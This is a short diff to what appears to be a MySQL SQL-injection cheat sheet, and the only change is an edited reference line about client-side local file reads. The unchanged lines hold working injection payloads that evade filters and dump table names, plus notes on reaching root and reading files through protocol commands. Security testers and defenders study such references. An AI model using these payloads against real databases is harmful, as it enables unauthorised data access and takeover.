@@ -25,7 +25,7 @@ select -> select%23randomText%0A and user() -> user%23randomText%0A() # see sqlm
 select X'31333337' == select 0x31333337
 comments: /*!50000union*/ /*!50000all*/ /*!50000select*/ group_concat(table_name) /*!50000from*/ information_schema.tables
 no space: (select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))
-client-side arbitrary file inclusion LOCAL INFLE https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html
+client-side arbitrary local file include https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/
 become root via auth_socket, use different protocol to open files with COM_BINLOG_DUMP (need REPLICATION SLAVE privilege) or guess root pw with COM_CHANGE_USER command 
 
 # get everything in one line and one column
